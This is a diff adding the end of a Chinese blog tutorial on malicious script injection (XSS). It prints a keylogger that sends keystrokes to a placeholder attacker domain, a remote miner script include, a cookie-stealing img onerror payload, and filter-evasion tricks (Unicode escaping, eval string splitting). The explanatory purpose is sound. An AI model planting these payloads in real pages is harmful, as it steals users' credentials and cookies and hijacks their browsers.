+</div><h3 id="4-监听用户行为偷密码操作记录">4. 监听用户行为（偷密码/操作记录）
+</h3><p>记录用户的键盘输入、鼠标点击：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 监听所有键盘输入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nb">document</span><span class="p">.</span><span class="nx">onkeydown</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// 把按键发送到攻击者服务器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">new</span> <span class="nx">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&#34;http://攻击者域名/log?key=&#34;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="5-植入木马挖矿脚本消耗用户资源">5. 植入木马/挖矿脚本（消耗用户资源）
+</h3><p>让用户浏览器偷偷挖矿、下载恶意程序：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&#34;http://攻击者域名/miner.js&#34;</span><span class="o">&gt;&lt;</span><span class="sr">/script&gt; /</span><span class="o">/</span> <span class="nx">加载挖矿脚本</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="三恶意代码的伪装手段实战中攻击者常用">三、恶意代码的“伪装”手段（实战中攻击者常用）
+</h2><p>为了绕过网站过滤，攻击者会把恶意代码伪装成无害形式，比如：</p>
+<ol>
+<li><strong>编码混淆</strong>：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// 把 alert(1) 转成 Unicode 编码，绕过关键词过滤
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">\u0061\u006c\u0065\u0072\u0074</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li><strong>标签替换</strong>：
+不用 <code>&lt;script&gt;</code> 标签，改用其他<strong>能执行 JS 的标签</strong>（本质还是恶意代码）：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;document.location=&#39;http://攻击者域名?c=&#39;+document.cookie&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;偷Cookie的代码&#34;</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li><strong>拆分拼接</strong>：
+把关键词拆分开，绕过“关键词过滤”：
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="s2">&#34;aler&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="s2">&#34;t&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&#34;(1)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">eval</span><span class="p">(</span><span class="nx">a</span><span class="o">+</span><span class="nx">b</span><span class="o">+</span><span class="nx">c</span><span class="p">);</span> <span class="c1">// 拼接成 alert(1) 执行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ol>
+<h2 id="四和正常-js-代码的区别">四、和“正常 JS 代码”的区别
+</h2><div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>正常 JS 代码</th>
+<th>恶意 <code>&lt;script&gt;</code> 代码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>执行目的</td>
+<td>实现网站功能（登录、展示）</td>
+<td>窃取信息、劫持账号、损害用户</td>
+</tr>
+<tr>
+<td>授权状态</td>
+<td>网站开发者/用户明确允许</td>
+<td>未经授权，偷偷执行</td>
+</tr>
+<tr>
+<td>可见性</td>
+<td>行为透明（如点击按钮才执行）</td>
+<td>隐蔽执行（用户无感知）</td>
+</tr>
+</tbody>
+</table></div>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Loyal
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/lloyal-sudo01/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
